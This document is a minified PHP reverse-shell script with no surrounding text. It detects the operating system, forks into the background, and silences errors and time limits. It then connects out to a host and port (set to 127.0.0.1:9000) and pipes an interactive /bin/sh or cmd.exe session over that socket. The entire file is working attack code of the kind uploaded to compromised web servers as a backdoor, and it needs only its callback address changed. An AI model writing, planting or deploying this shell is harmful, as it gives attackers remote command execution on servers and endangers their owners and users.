<?php class Shell{var $a=null;var $p=null;var $os=null;var $sh=null;var $des=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));var $b=1024;var $c=0;var $e=false;var $sd=true;function Shell($a,$p){$this->a=$a;$this->p=$p;}function d(){$d=true;$os=strtoupper(PHP_OS);if(strpos($os,'LINUX')!==false||strpos($os,'DARWIN')!==false){$this->os='LINUX';$this->sh='/bin/sh';}else if(strpos($os,'WINDOWS')!==false||strpos($os,'WINNT')!==false||strpos($os,'WIN32')!==false){$this->os='WINDOWS';$this->sh='cmd.exe';}else{$d=false;echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";}return $d;}function dae(){$e=false;if(!function_exists('pcntl_fork')){echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";}else if(($pid=@pcntl_fork())<0){echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";}else if($pid>0){$e=true;echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";}else if(posix_setsid()<0){echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";}else{echo "DAEMONIZE: Completed successfully!\n";}return $e;}function s(){@error_reporting(0);@set_time_limit(0);@umask(0);}function dmp($d){if($this->sd){$d=str_replace('<','&lt;',$d);$d=str_replace('>','&gt;',$d);echo $d;}}function r($s,$n,$b){if(($d=@fread($s,$b))===false){$this->e=true;echo"STRM_ERROR: Cannot read from {$n}, script will now exit...\n";}return $d;}function w($s,$n,$d){if(($b=@fwrite($s,$d))===false){$this->e=true;echo"STRM_ERROR: Cannot write to {$n}, script will now exit...\n";}return $b;}function rw($i,$o,$in,$on){while(($d=$this->r($i,$in,$this->b))&&$this->w($o,$on,$d)){if($this->os==='WINDOWS'&&$on==='STDIN'){$this->c+=strlen($d);}$this->dmp($d);}}function brw($i,$o,$in,$on){$s=fstat($i)['size'];if($this->os==='WINDOWS'&&$in==='STDOUT'&&$this->c){while($this->c>0&&($b=$this->c>=$this->b?$this->b:$this->c)&&$this->r($i,$in,$b)){$this->c-=$b;$s-=$b;}}while($s>0&&($b=$s>=$this->b?$this->b:$s)&&($d=$this->r($i,$in,$b))&&$this->w($o,$on,$d)){$s-=$b;$this->dmp($d);}}function run(){if($this->d()&&!$this->dae()){$this->s();$soc=@fsockopen($this->a,$this->p,$eno,$estr,30);if(!$soc){echo"SOC_ERROR: {$eno}: {$estr}\n";}else{stream_set_blocking($soc,false);$proc=@proc_open($this->sh,$this->des,$p);if(!$proc){echo "PROC_ERROR: Cannot start the shell\n";}else{foreach($p as $pi){stream_set_blocking($pi,false);}@fwrite($soc,"SOCKET: Shell has connected!\n");do{if(feof($soc)){echo "SOC_ERROR: Shell connection has been terminated\n";break;}else if(feof($p[1])){echo "PROC_ERROR: Shell process has been terminated\n";break;}$s=array('read'=>array($soc,$p[1],$p[2]),'write'=>null,'except'=>null);$ncs=@stream_select($s['read'],$s['write'],$s['except'],0);if($ncs===false){echo "STRM_ERROR: stream_select() failed\n";break;}else if($ncs>0){if($this->os==='LINUX'){if(in_array($soc,$s['read'])){$this->rw($soc,$p[0],'SOCKET','STDIN');}if(in_array($p[2],$s['read'])){$this->rw($p[2],$soc,'STDERR','SOCKET');}if(in_array($p[1],$s['read'])){$this->rw($p[1],$soc,'STDOUT','SOCKET');}}else if($this->os==='WINDOWS'){if(in_array($soc,$s['read'])){$this->rw($soc,$p[0],'SOCKET','STDIN');}if(($fs=fstat($p[2]))&&$fs['size']){$this->brw($p[2],$soc,'STDERR','SOCKET');}if(($fs=fstat($p[1]))&&$fs['size']){$this->brw($p[1],$soc,'STDOUT','SOCKET');}}}}while(!$this->e);foreach($p as $pi){fclose($pi);}proc_close($proc);}fclose($soc);}}}}echo '<pre>';$sh=new Shell('127.0.0.1',9000);$sh->run();unset($sh);/*@gc_collect_cycles();*/echo '</pre>'; ?>
